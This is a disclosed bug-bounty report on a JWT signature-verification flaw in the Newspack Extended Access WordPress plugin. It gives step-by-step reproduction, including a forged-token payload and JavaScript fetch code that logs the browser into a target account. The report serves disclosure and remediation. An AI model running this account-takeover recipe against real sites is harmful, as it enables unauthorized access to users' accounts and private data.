# Authentication & Registration Bypass in Newspack Extended Access

## Report Details
- **Report ID**: 2536758
- **URL**: https://hackerone.com/reports/2536758
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-06-05T09:20:20.682Z
- **Disclosed**: 2024-07-05T12:14:56.046Z

## Reporter
- **Username**: xurizaemon0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
The Newspack Extended Access plugin omits to verify JWT signing on the registration and login JSON endpoint. This permits registration of accounts with arbitrary (user-supplied) details, and auth bypass and account hijack if a target account email is known.

## Platform(s) Affected:
Any website using [Newspack Extended Access plugin](https://github.com/Automattic/newspack-extended-access).

## Steps To Reproduce:

Create an unsigned JWT containing payload value `{"azp": {app id}, "email": "target@example.org"}`. Use a browser to supply this data to the Extended Access registration endpoint. Browser will be authenticated as the target user.

### Requirements

1. Site installed and configured with Newspack Extended Access (+ dependencies incl WooCommerce, WC Memberships, Newspack).
 2. Target user email is known (for account hijack)

### Notes

1. For account hijack, target user must be registered via SwG / Extended Access initially
2. There was previously a mitigation that hijack of Administrator or Editor roles was prevented, this was recently *removed* in [automattic/newspack-extended-access@4c87c25a](https://github.com/Automattic/newspack-extended-access/commit/4c87c25a58a6e16515e27e99eb040b336a4d3b07) 

### Reproduction

1. Obtain the target site's Google App ID (ex: 12345-abcdef.apps.googleusercontent.com) by visiting the site and copying the JS value `authenticationSettings.googleClientApiID`
2. Obtain the target email of the desired account (ex: test@example.org) to either hijack (existing) or register as a new user verified as associated with the named Google account
3. Compose a JWT using those details:
4. Execute a fetch request to the plugin endpoint using the supplied JS below
5. The browser will now be logged into the target account.

```json
{
  "sub": "1234567890",
  "azp": "12345-abcdef.apps.googleusercontent.com" ,
  "email": "test@example.org"
}
```

```js
// Endpoint URL
let url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;
// JWT contents - this JWT contains the details above, and will not work as-is.
let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYXpwIjoiMTIzNDUtYWJjZGVmLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIn0.Nq7Nc2AyWe17gPmIHVRCc4z9qKP-HBZwfWhyQ_dg9X0";
// Provide token to authentication endpoint.
fetch(  
    url,  
    {  
       cache: 'no-store',  
       method: 'POST',  
       headers: {  
          'Content-type': 'text/plain',  
       },  
       body: token  
    }  
).then(response => {  
    console.log(response.json(), 'response');  
})
```

## Supporting Material/References:

* JWT is accepted without validation of JWT signature. Ref https://github.com/Automattic/newspack-extended-access/blob/2b22de2c2543b46a989fdcaa626fd011c1b39d59/includes/class-rest-controller.php#L84-L89
* Mitigation: Newspack restricts authentication to user accounts which have metadata indicating that Signin with Google was used for initial sign-in. Ref https://github.com/Automattic/newspack-plugin/blob/trunk/includes/reader-activation/class-reader-activation.php#L681-L690

### Impacts

- Registration of accounts with arbitrary (user-supplied) details
- Personal data (eg the target user's additional account details, billing address etc) will be visible to the attacker.
- Registration processes may be bypassed.
- Bulk registration may be used to deny service to the target website.
- If a hijacked account has Admin role, full WordPress access can be obtained.
- Authentication bypass if the target account email is known
- Injection of untrusted data into user profiles

## Solution recommendation

The solution here is I believe outlined in the integration documentation:

- Google's JWT signing keys are made available from an HTTP endpoint
- These keys should be retrieved periodically and stored in the consuming application (eg as a WordPress setting or other value)
- When a JWT is presented to the endpoint, the JWT signature should be verified against Google's recently published keys before progressing with registration or authentication.

## Impact

- Authentication bypass
- Registration bypass
- Access to user private data
- Potential for DoS
- Potential for full system access

## Attachments
No attachments
